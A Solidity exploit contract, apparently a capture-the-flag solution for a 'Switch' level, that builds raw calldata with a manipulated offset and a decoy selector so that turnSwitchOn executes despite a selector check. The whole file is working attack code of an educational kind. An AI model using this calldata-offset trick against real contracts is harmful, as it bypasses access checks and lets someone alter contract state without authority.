// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Switch {
    function flipSwitch(bytes memory) external;
    function turnSwitchOn() external;
    function turnSwitchOff() external;
}

contract SwitchAttack {
    address switchAddress;

    constructor(address _switchAddress) {
        switchAddress = _switchAddress;
    }

    function attack() external {
        (bool ok, ) = switchAddress.call(
            // Don't forget. All section is allocated 32 bytes (Except first selector).
            // Total size : 4 + 32 * 5 = 164 bytes
            abi.encodePacked(
                Switch.flipSwitch.selector,         // flipSwitch Selector (4 bytes)
                abi.encode(96),                     // Calldata offset (32 bytes)
                abi.encode(0x00),                   // DUMMY (32 bytes)
                abi.encode(Switch.turnSwitchOff.selector),      // turnSwitchOff Selector (4 bytes)
                abi.encode(4),                      // Real size of data (32 bytes)
                abi.encodeWithSelector(Switch.turnSwitchOn.selector)    // Calldata (4 bytes)
            )
        );

        require(ok);
    }
}
